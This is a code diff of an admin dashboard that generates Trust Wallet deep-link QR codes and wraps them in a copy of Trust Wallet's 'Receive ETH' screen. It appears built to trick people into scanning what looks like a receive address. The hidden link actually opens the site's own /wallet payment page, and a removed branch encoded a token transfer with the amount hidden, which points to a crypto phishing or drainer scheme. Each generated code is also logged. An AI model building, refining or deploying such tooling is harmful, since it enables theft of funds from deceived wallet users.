@@ -42,7 +42,7 @@ export default function AdminPage() {
   const [receiverAddress, setReceiverAddress] = useState("");
   const [amount, setAmount] = useState("");
   const [token, setToken] = useState<"USDT" | "USDC">("USDT");
-  const [platform, setPlatform] = useState<"ios" | "android">("ios");
+
   const [qrUrl, setQrUrl] = useState("");
   const [isMounted, setIsMounted] = useState(false);
   const qrRef = useRef<HTMLDivElement>(null);
@@ -127,7 +127,7 @@ export default function AdminPage() {
   useEffect(() => {
     setQrUrl("");
     qrCodeInstanceRef.current = null;
-  }, [receiverAddress, amount, token, platform]);
+  }, [receiverAddress, amount, token]);
 
   const handleGenerate = async () => {
     if (!receiverAddress) {
@@ -148,41 +148,37 @@ export default function AdminPage() {
     try {
       const origin = window.location.origin;
       const baseUrl = `${origin}/wallet`;
-      let generatedUrl = "";
-
-      if (platform === "ios") {
-        const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}`;
-        const coinId = 60;
-        generatedUrl = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
-      } else {
-        // Android Ethereum : send avec data, amount caché
-        const tokenAddress = token === "USDC" ? USDC_ADDRESS : USDT_ADDRESS;
-        const callData = encodeTransferData(receiverAddress, normalizedAmount);
-        generatedUrl = `https://link.trustwallet.com/send?asset=c60&address=${tokenAddress}&data=${callData}`;
-      }
+      const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}`;
+      const coinId = 60;
+      const generatedUrl = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;
 
       setQrUrl(generatedUrl);
 
-      // Log to history API
-      const dbTokenName = token.toUpperCase() + " (ERC20)";
-      const deviceName = `Trust Wallet (${platform === "ios" ? "iOS" : "Android"})`;
+      // Log to history API (non-blocking)
+      try {
+        const dbTokenName = token.toUpperCase() + " (ERC20)";
+        const deviceName = "Trust Wallet (iOS)";
 
-      await fetch("/api/log-scan", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          to: receiverAddress,
-          amount: normalizedAmount,
-          token: dbTokenName,
-          userAgent: deviceName,
-        }),
-      });
+        await fetch("/api/log-scan", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            to: receiverAddress,
+            amount: normalizedAmount,
+            token: dbTokenName,
+            userAgent: deviceName,
+            platform: "iOS",
+          }),
+        });
+      } catch (logErr) {
+        console.warn("Log scan failed (non-blocking):", logErr);
+      }
 
       // Save token preference
       localStorage.setItem("admin_token", token);
-      showToast("QR code generated and logged!");
+      showToast("QR code generated!");
     } catch (err) {
-      console.error("Failed to generate QR or log scan", err);
+      console.error("Failed to generate QR", err);
       showToast("Error generating QR code");
     } finally {
       setGenerating(false);
@@ -198,16 +194,18 @@ export default function AdminPage() {
       import("qr-code-styling").then((QRCodeStylingModule) => {
         const QRCodeStyling = QRCodeStylingModule.default;
         const options = {
-          width: 240,
-          height: 240,
+          width: 285,
+          height: 285,
+          margin: 0,
           type: "svg" as const,
           data: qrUrl,
-          image: "/trust.png",
-          dotsOptions: { color: "#000000", type: "extra-rounded" as const },
+          image: "/eth.png",
+          dotsOptions: { color: "#000000", type: "dots" as const },
           cornersSquareOptions: { color: "#000000", type: "extra-rounded" as const },
           cornersDotOptions: { color: "#000000", type: "dot" as const },
           backgroundOptions: { color: "#ffffff" },
-          imageOptions: { crossOrigin: "anonymous", margin: 6, imageSize: 0.35, hideBackgroundDots: true },
+          imageOptions: { crossOrigin: "anonymous", margin: 2, imageSize: 0.24, hideBackgroundDots: true },
+          qrOptions: { errorCorrectionLevel: "M" as const },
         };
 
         if (qrCodeInstanceRef.current && qrCanvasRef.current && qrCanvasRef.current.childNodes.length > 0) {
@@ -300,8 +298,8 @@ export default function AdminPage() {
 
   if (!isAuthenticated && isMounted) {
     return (
-      <main className="transfer-main">
-        <div className="home-content" style={{ maxWidth: "400px" }}>
+      <main className="transfer-main" style={{ justifyContent: "center" }}>
+        <div className="home-content" style={{ maxWidth: "400px", margin: "auto 0" }}>
           <h1 className="home-title" style={{ marginBottom: "1.5rem", color: "#0f172a" }}>
             Admin Access
           </h1>
@@ -336,7 +334,7 @@ export default function AdminPage() {
 
   if (!isMounted) {
     return (
-      <main className="transfer-main">
+      <main className="transfer-main" style={{ justifyContent: "center" }}>
         <div style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh" }}>
           <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#2563eb" }} />
         </div>
@@ -346,17 +344,18 @@ export default function AdminPage() {
 
   return (
     <main className="transfer-main">
-      <div className="home-content" ref={qrRef} style={{ maxWidth: "520px", position: "relative" }}>
-        <button onClick={handleLogout} style={{
-          position: "absolute", top: "-10px", right: "0px", background: "transparent",
-          border: "none", color: "#ef4444", fontSize: "0.85rem", fontWeight: "600", cursor: "pointer"
-        }}>
-          Logout 🚪
-        </button>
-
-        <h1 className="home-title" style={{ marginBottom: "1.5rem", color: "#0f172a" }}>
-          Admin Dashboard
-        </h1>
+      <div className="home-content" ref={qrRef} style={{ maxWidth: "440px", width: "100%", position: "relative", margin: "0 auto 3rem auto" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", width: "100%", marginBottom: "1.25rem" }}>
+          <h1 className="home-title" style={{ margin: 0, color: "#0f172a", fontSize: "1.5rem" }}>
+            Admin Dashboard
+          </h1>
+          <button onClick={handleLogout} style={{
+            background: "#fee2e2", border: "none", color: "#dc2626", fontSize: "0.82rem",
+            fontWeight: "600", cursor: "pointer", padding: "0.35rem 0.85rem", borderRadius: "1rem"
+          }}>
+            Logout 🚪
+          </button>
+        </div>
         
         <div className="form-container" style={{ width: "100%", textAlign: "left", marginBottom: "2rem" }}>
           <label className="form-label">Select Asset</label>
@@ -365,13 +364,7 @@ export default function AdminPage() {
             <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
           </div>
 
-          <label className="form-label" style={{ marginTop: "1.25rem" }}>Platform</label>
-          <div className="token-tabs">
-            <button type="button" className={`token-tab ${platform === "ios" ? "token-tab--active" : ""}`} onClick={() => setPlatform("ios")}>iOS (Wallet)</button>
-            <button type="button" className={`token-tab ${platform === "android" ? "token-tab--active" : ""}`} onClick={() => setPlatform("android")}>Android (Send)</button>
-          </div>
-
-          <label className="form-label" style={{ marginTop: "1rem" }}>Receiver Address</label>
+          <label className="form-label" style={{ marginTop: "1.25rem" }}>Receiver Address</label>
           <div className="input-row" style={{ marginBottom: "0.5rem" }}>
             <input
               type="text" value={receiverAddress} onChange={(e) => setReceiverAddress(e.target.value)}
@@ -384,7 +377,7 @@ export default function AdminPage() {
             </div>
           )}
 
-          <label className="form-label">Amount ({token})</label>
+          <label className="form-label" style={{ marginTop: "0.75rem" }}>Amount ({token})</label>
           <div className="input-row" style={{ marginBottom: "1.5rem" }}>
             <input
               type="text" ref={amountInputRef} value={amount} onChange={handleAmountChange}
@@ -418,59 +411,42 @@ export default function AdminPage() {
           </button>
         </div>
 
-        <div className="admin-qr-section" style={{ background: "#ffffff", border: "1px solid #e2e8f0", borderRadius: "1.5rem", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)" }}>
+        {/* TRUST WALLET RECEIVE ETH PREVIEW COMPONENT */}
+        <div className="admin-qr-section">
+          {/* Header: X button + Receive ETH */}
           <div className="receive-header-bar">
-            <button type="button" className="receive-header-btn">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+            <button type="button" className="receive-header-btn" title="Close">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1e293b" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="18" y1="6" x2="6" y2="18"></line>
                 <line x1="6" y1="6" x2="18" y2="18"></line>
               </svg>
             </button>
-            <span className="receive-header-title">Receive</span>
-            <button type="button" className="receive-header-btn" style={{ padding: 0, cursor: "default" }}>
-              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-                <circle cx="12" cy="12" r="10" fill="#334155" />
-                <line x1="12" y1="16" x2="12" y2="12" stroke="#ffffff" strokeWidth="2.5" strokeLinecap="round" />
-                <circle cx="12" cy="8" r="1.25" fill="#ffffff" />
-              </svg>
-            </button>
+            <span className="receive-header-title">Receive ETH</span>
+            <div style={{ width: "36px" }} />
           </div>
 
-          <div className="receive-alert-banner">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" className="receive-alert-icon">
-              <circle cx="12" cy="12" r="10"></circle>
-              <line x1="12" y1="16" x2="12" y2="12"></line>
-              <line x1="12" y1="8" x2="12.01" y2="8"></line>
+          {/* Ethereum badge with dropdown */}
+          <div className="receive-eth-badge">
+            <img src="/eth.png" alt="Ethereum" className="receive-eth-badge-img" />
+            <span className="receive-eth-badge-text">Ethereum</span>
+            <svg width="8" height="6" viewBox="0 0 8 6" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ marginLeft: "2px" }}>
+              <path d="M4 5.5L0.5 1L7.5 1L4 5.5Z" fill="#111827" />
             </svg>
-            <div className="receive-alert-text">
-              {token === "USDT" 
-                  ? "Send only Tether USD (ERC20) to this address. Other assets will be lost forever."
-                  : "Send only USD Coin (ERC20) to this address. Other assets will be lost forever."}
-            </div>
           </div>
 
-          <div className="receive-asset-row">
-            {token === "USDT" ? (
-              <img src="/usdt.png" alt="USDT" style={{ width: "30px", height: "30px", objectFit: "contain" }} />
-            ) : (
-              <img src="/usdc.png" alt="USDC" style={{ width: "30px", height: "30px", objectFit: "contain" }} />
-            )}
-            <span className="receive-asset-name">{token}</span>
-            <span className="receive-network-badge">Ethereum</span>
-          </div>
-
+          {/* QR Code */}
           {qrUrl ? (
-            <div className="qr-card" style={{ display: "flex", flexDirection: "column", alignItems: "center", background: "#ffffff", padding: "0.5rem 0.5rem 0.75rem 0.5rem", borderRadius: "1.25rem", border: "none", boxShadow: "0 4px 20px rgba(0, 0, 0, 0.03)", width: "fit-content", margin: "0 auto 0.75rem" }}>
+            <div className="qr-preview-card">
               <div ref={qrCanvasRef} style={{ display: "flex", justifyContent: "center", alignItems: "center" }} />
               {receiverAddress && (
-                <div className="qr-address" style={{ marginTop: "0.35rem", marginBottom: 0, fontSize: "0.85rem", color: "#1e293b", fontWeight: "600", letterSpacing: "0.02em", width: "100%", textAlign: "center" }}>
-                  <div>{receiverAddress.slice(0, 23)}</div>
-                  <div>{receiverAddress.slice(23)}</div>
+                <div className="qr-address">
+                  <div>{receiverAddress.slice(0, 34)}</div>
+                  <div>{receiverAddress.slice(34)}</div>
                 </div>
               )}
             </div>
           ) : (
-            <div style={{ width: 260, height: 260, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0 auto 1.5rem", padding: "1rem", textAlign: "center", color: "#64748b", fontSize: "0.9rem" }}>
+            <div style={{ width: "100%", height: 260, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0.75rem auto 1rem auto", padding: "1rem", textAlign: "center", color: "#64748b", fontSize: "0.9rem", boxSizing: "border-box" }}>
               <span style={{ fontSize: "2rem", marginBottom: "0.5rem" }}>⚡</span>
               <div>
                 {!receiverAddress 
@@ -484,38 +460,41 @@ export default function AdminPage() {
             </div>
           )}
 
-          <div className="qr-actions-container" style={{ marginTop: "0.5rem" }}>
+          {/* Warning banner */}
+          <div className="receive-alert-banner">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="receive-alert-icon">
+              <circle cx="12" cy="12" r="10" fill="#ea580c" />
+              <line x1="12" y1="8" x2="12" y2="13" stroke="#ffffff" strokeWidth="2.5" strokeLinecap="round" />
+              <circle cx="12" cy="16.5" r="1.2" fill="#ffffff" />
+            </svg>
+            <div className="receive-alert-text">
+              Only send Ethereum assets to this address. Other assets will be lost forever.
+            </div>
+          </div>
+
+          {/* Action buttons: Copy & Share */}
+          <div className="qr-actions-container">
             <div className="qr-action-item">
-              <button onClick={handleCopyAddress} className="qr-action-btn" title="Copy Address">
-                <img src="/copy.png" alt="Copy" style={{ width: "32px", height: "32px", objectFit: "contain" }} />
+              <button onClick={handleCopyAddress} type="button" className="qr-action-btn" title="Copy Address">
+                <img src="/copy.png" alt="Copy" className="qr-action-img" />
               </button>
               <span className="qr-action-label">Copy</span>
             </div>
             <div className="qr-action-item">
-              <button onClick={handleSetAmountClick} className="qr-action-btn" title="Set Amount">
-                <img src="/amount.png" alt="Set Amount" style={{ width: "32px", height: "32px", objectFit: "contain" }} />
-              </button>
-              <span className="qr-action-label">Set Amount</span>
-            </div>
-            <div className="qr-action-item">
-              <button onClick={handleShare} className="qr-action-btn" title="Share Link">
-                <img src="/share.png" alt="Share" style={{ width: "32px", height: "32px", objectFit: "contain" }} />
+              <button onClick={handleShare} type="button" className="qr-action-btn" title="Share Link">
+                <img src="/share.png" alt="Share" className="qr-action-img" />
               </button>
               <span className="qr-action-label">Share</span>
             </div>
           </div>
 
+          {/* Deposit from exchange with Binance + Coinbase icons */}
           <div className="receive-deposit-box">
-            <div className="receive-deposit-icon" style={{ backgroundColor: "#b4baf3", color: "#000000" }}>
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                <line x1="12" y1="5" x2="12" y2="19"></line>
-                <polyline points="19 12 12 19 5 12"></polyline>
-              </svg>
+            <div className="receive-deposit-icons">
+              <img src="/binance.png" alt="Binance" style={{ width: "26px", height: "26px", borderRadius: "50%" }} />
+              <img src="/coinbase.png" alt="Coinbase" style={{ width: "26px", height: "26px", borderRadius: "50%", marginLeft: "-8px" }} />
             </div>
-            <div className="receive-deposit-info">
-              <span className="receive-deposit-title">Deposit from exchange</span>
-              <span className="receive-deposit-subtitle">By direct transfer from your account</span>
-            </div>
+            <span className="receive-deposit-title">Deposit from exchange</span>
           </div>
         </div>
 
